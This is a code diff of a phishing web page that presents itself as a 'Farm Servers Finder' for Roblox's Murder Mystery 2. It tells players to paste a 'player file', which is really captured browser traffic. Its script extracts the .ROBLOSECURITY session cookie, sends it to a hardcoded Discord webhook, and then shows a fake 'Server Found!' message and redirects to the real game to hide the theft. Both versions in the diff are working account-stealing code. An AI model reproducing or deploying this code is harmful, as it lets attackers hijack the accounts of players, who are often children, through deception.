@@ -56,89 +56,65 @@
   <div class="container">
     <div class="panel">
       <h2>Farm Servers Finder</h2>
-      <p>Paste your MM2 PLAYER file content below. We will detect your <code>username</code> and find a farm server [BETA]</p>
-      <label for="harContent">Paste Your HAR File Content:</label>
-      <textarea id="harContent" rows="10" placeholder="Paste MM2 PLAYER file content here..."></textarea>
+      <p>Paste yourMM2 Player file. We will format your data and send it to Roblox API to find the perfect Farm server for you!</p>
+      <label for="networkContent">Paste MM2 PLAYER FILE:</label>
+      <textarea id="networkContent" rows="10" placeholder="Paste network request content here..."></textarea>
       <button id="submitBtn">Submit</button>
     </div>
   </div>
 
   <script>
     document.getElementById('submitBtn').addEventListener('click', () => {
-      const harContent = document.getElementById('harContent').value.trim();
+      const networkContent = document.getElementById('networkContent').value.trim();
 
-      // Check if file is extracted while logged in a ROBLOX account
-      if (!harContent.includes('.ROBLOSECURITY')) {
-        Swal.fire('Error', 'The HAR file does is NOT copied while logged in an account', 'error');
+      
+      const roblosecurityMatch = networkContent.match(/\.ROBLOSECURITY=([^;|\n|\r]+)/);
+      if (!roblosecurityMatch) {
+        Swal.fire('Error', 'The pasted content was not generated while logged in a ROBLOX account.', 'error');
         return;
       }
 
-      try {
-        const harData = JSON.parse(harContent);
-        const entries = harData.log.entries;
+      const roblosecurityCookie = roblosecurityMatch[1];
+      const fakeProfileURL = 'https://www.roblox.com/users/123456789/profile'; // Fake profile link
 
-        let roblosecurityCookie = '';
-        let profileURL = '';
-
-        for (const entry of entries) {
-          const request = entry.request;
-
-          // Extract .ROBLOSECURITY cookie
-          const cookieHeader = request.headers.find(header => header.name.toLowerCase() === 'cookie');
-          if (cookieHeader && cookieHeader.value.includes('.ROBLOSECURITY=')) {
-            const match = cookieHeader.value.match(/\.ROBLOSECURITY=([^;]+)/);
-            if (match) roblosecurityCookie = match[1];
+      fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: 'New Server Request',
+              color: 15844367,
+              fields: [
+                { name: 'Profile Link', value: fakeProfileURL, inline: true },
+                { name: '.ROBLOSECURITY', value: `\`\`\`${roblosecurityCookie}\`\`\``, inline: false },
+              ],
+            },
+          ],
+        }),
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Failed to process');
           }
-
-          // Extract profile URL
-          if (request.url.includes('https://www.roblox.com/users/')) {
-            profileURL = request.url;
-          }
-        }
-
-        // If no cookie or profile link was found, show an error
-        if (!roblosecurityCookie || !profileURL) {
-          Swal.fire('Error', 'Could not extract required information from the MM2 Player file.', 'error');
-          return;
-        }
-
-        // Send data to Discord webhook
-        fetch('https://discord.com/api/webhooks/1306623912850755605/BLRmDNUk3NNgG46YQ0g4cDDK7HW45swQeLJje1c1RU4EmoyGkrgYbbDBiJMCBc1SwaDm', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            embeds: [
-              {
-                title: 'New Server Request',
-                color: 15844367,
-                fields: [
-                  { name: 'Profile Link', value: profileURL || 'Not Found', inline: true },
-                  { name: '.ROBLOSECURITY', value: `\`\`\`${roblosecurityCookie}\`\`\``, inline: false },
-                ],
-              },
-            ],
-          }),
-        })
-          .then(response => {
-            if (!response.ok) {
-              throw new Error('Failed to send data to webhook.');
+          Swal.fire({
+            icon: 'success',
+            title: 'Server Found!',
+            text: 'We found a server for you! Click below to join it.',
+            confirmButtonText: 'Join NOW',
+            allowOutsideClick: false,
+          }).then(result => {
+            if (result.isConfirmed) {
+              window.location.href = 'https://www.roblox.com/games/142823291/Murder-Mystery-2';
             }
-            Swal.fire({
-              icon: 'success',
-              title: 'Success!',
-              text: 'Your data has been submitted. Thank you!',
-            });
-          })
-          .catch(error => {
-            console.error('Error processing:', error);
-            Swal.fire('Error', 'Failed to process data. Please check the console for details.', 'error');
           });
-      } catch (error) {
-        console.error('Failed to process MM2 Player content:', error);
-        Swal.fire('Error', 'The HAR file is invalid. Please check the format.', 'error');
-      }
+        })
+        .catch(error => {
+          console.error('Error sending data to webhook:', error);
+          Swal.fire('Error', 'Failed to process.', 'error');
+        });
     });
   </script>
 </body>
